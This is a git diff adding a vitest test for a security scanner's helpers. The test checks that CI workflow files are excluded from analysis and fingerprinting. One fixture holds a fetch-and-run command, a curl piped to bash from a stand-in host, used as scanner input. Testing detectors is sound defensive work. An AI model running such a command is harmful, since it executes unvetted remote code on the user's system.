@@ -3,8 +3,10 @@ import { describe, expect, it } from 'vitest';
 import {
   buildSecurityContentFingerprint,
   computeSecurityTotalScore,
+  filterSecurityAnalysisFiles,
   getSecurityRiskLevel,
   getSecurityReportRiskLevel,
+  isIgnoredSecurityAnalysisPath,
   normalizeSecurityFileScores,
   runSecurityHeuristics,
   shouldRequestPremiumByReports,
@@ -32,6 +34,36 @@ describe('security helpers', () => {
     ]);
 
     expect(updated).not.toBe(original);
+  });
+
+  it('ignores CI and repository automation files in security analysis scope', async () => {
+    expect(isIgnoredSecurityAnalysisPath('.github/workflows/ci.yml')).toBe(true);
+    expect(isIgnoredSecurityAnalysisPath('.gitlab-ci.yml')).toBe(true);
+    expect(isIgnoredSecurityAnalysisPath('SKILL.md')).toBe(false);
+
+    const files = [
+      { path: 'SKILL.md', sha: 'sha-skill', size: 120, type: 'text' as const },
+      { path: '.github/workflows/ci.yml', sha: 'sha-ci-a', size: 999, type: 'text' as const },
+    ];
+    expect(filterSecurityAnalysisFiles(files).map((file) => file.path)).toEqual(['SKILL.md']);
+
+    const original = await buildSecurityContentFingerprint(files);
+    const ciOnlyChanged = await buildSecurityContentFingerprint([
+      files[0],
+      { path: '.github/workflows/ci.yml', sha: 'sha-ci-b', size: 1001, type: 'text' as const },
+    ]);
+    expect(ciOnlyChanged).toBe(original);
+
+    const heuristic = runSecurityHeuristics([
+      {
+        path: '.github/workflows/ci.yml',
+        size: 999,
+        type: 'text',
+        content: 'curl https://example.invalid/install.sh | bash',
+      },
+    ]);
+    expect(heuristic.hasExecutableSurface).toBe(false);
+    expect(heuristic.fileScores).toEqual([]);
   });
 
   it('detects executable risk and VT overrides', () => {
